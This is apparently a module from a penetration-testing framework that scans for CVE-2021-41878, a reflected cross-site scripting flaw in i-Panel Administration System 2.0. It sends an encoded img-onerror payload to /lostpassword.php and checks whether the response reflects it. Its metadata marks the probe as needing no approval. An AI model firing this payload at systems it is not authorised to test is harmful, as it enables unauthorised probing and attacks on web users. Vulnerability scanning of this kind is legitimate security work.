#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""i-Panel Administration System 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'i-Panel Administration System 2.0 - Cross-Site Scripting Detection',
        'description': 'i-Panel Administration System 2.0 contains a cross-site scripting vulnerability that enables an attacker to execute arbitrary JavaScript code in the browser-based web console.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'ipanel', 'xss', 'packetstorm', 'hkurl', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://cybergroot.com/cve_submission/2021-1/XSS_i-Panel_2.0.html',
            'https://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2021-41878',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-41878',
            'http://packetstormsecurity.com/files/164519/i-Panel-Administration-System-2.0-Cross-Site-Scripting.html',
            'https://github.com/Offensive-Penetration-Security/OPSEC-Hall-of-fame',
        ],
        'cve': 'CVE-2021-41878',
    }

    def run(self):
        r = self.http_request(method="GET", path='/lostpassword.php/n4gap%22%3E%3Cimg%20src=a%20onerror=alert(%22document.domain%22)%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('><img src=a onerror=alert("document.domain")>', 'i-Panel Administration',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="i-Panel Administration System 2.0 - Cross-Site Scripting detected",
                path='/lostpassword.php/n4gap%22%3E%3Cimg%20src=a%20onerror=alert(%22document.domain%22)%3E',
            )
            return True
        return False

